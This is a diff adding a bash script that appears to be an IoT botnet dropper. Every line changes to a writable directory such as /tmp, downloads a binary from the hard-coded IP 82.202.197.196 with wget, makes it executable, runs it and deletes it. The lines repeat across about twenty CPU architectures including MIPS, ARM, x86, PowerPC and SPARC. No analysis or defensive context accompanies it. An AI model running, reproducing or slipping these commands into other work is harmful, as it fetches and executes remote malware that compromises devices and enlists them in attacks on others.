@@ -1,0 +1,21 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.202.197.196/fertinamips; chmod +x fertinamips; ./fertinamips; rm -rf fertinamips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.202.197.196/fertinamipsel; chmod +x fertinamipsel; ./fertinamipsel; rm -rf fertinamipsel
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.202.197.196/fertinash4; chmod +x fertinash4; ./fertinash4; rm -rf fertinash4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.202.197.196/fertinax86_64; chmod +x fertinax86_64; ./fertinax86_64; rm -rf fertinax86_64
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.202.197.196/fertinaarmv6l; chmod +x fertinaarmv6l; ./fertinaarmv6l; rm -rf fertinaarmv6l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.202.197.196/fertinai486; chmod +x fertinai486; ./fertinai486; rm -rf fertinai486
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.202.197.196/fertinai586; chmod +x fertinai586; ./fertinai586; rm -rf fertinai586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.202.197.196/fertinai686; chmod +x fertinai686; ./fertinai686; rm -rf fertinai686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.202.197.196/fertinappc; chmod +x fertinappc; ./fertinappc; rm -rf fertinappc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.202.197.196/fertinam68k; chmod +x fertinam68k; ./fertinam68k; rm -rf fertinam68k
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.202.197.196/fertinasparc; chmod +x fertinasparc; ./fertinasparc; rm -rf fertinasparc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.202.197.196/fertinaarmv4l; chmod +x fertinaarmv4l; ./fertinaarmv4l; rm -rf fertinaarmv4l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.202.197.196/fertinaarmv5l; chmod +x fertinaarmv5l; ./fertinaarmv5l; rm -rf fertinaarmv5l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.202.197.196/fertinapowerpc; chmod +x fertinapowerpc; ./fertinapowerpc; rm -rf fertinapowerpc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.202.197.196/fertinamips64; chmod +x fertinamips64; ./fertinamips64; rm -rf fertinamips64
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.202.197.196/fertinaarmv4eb; chmod +x fertinaarmv4eb; ./fertinaarmv4eb; rm -rf fertinaarmv4eb
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.202.197.196/fertinaarmv4tl; chmod +x fertinaarmv4tl; ./fertinaarmv4tl; rm -rf fertinaarmv4tl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.202.197.196/fertinaarm7; chmod +x fertinaarm7; ./fertinaarm7; rm -rf fertinaarm7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.202.197.196/fertinash2eb; chmod +x fertinash2eb; ./fertinash2eb; rm -rf fertinash2eb
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.202.197.196/fertinash2elf; chmod +x fertinash2elf; ./fertinash2elf; rm -rf fertinash2elf
